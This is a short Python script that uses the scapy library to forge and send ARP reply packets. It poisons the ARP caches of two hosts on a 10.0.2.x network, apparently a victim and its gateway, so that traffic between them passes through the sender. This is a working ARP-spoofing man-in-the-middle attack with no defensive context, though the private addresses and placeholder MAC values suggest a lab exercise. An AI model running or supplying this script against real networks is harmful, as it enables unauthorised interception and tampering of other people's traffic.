#!/usr/bin/env python

import scapy.layers.l2 as l2
import scapy.all as scapy


def spoof(target_ip, target_mac, spoof_ip):
    packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    print(packet.show())
    print(packet.summary())
    scapy.send(packet)


spoof("10.0.2.4", "00:11:22:33:44:55", "10.0.2.1")
spoof("10.0.2.1", "55:44:33:22:11:00", "10.0.2.4")
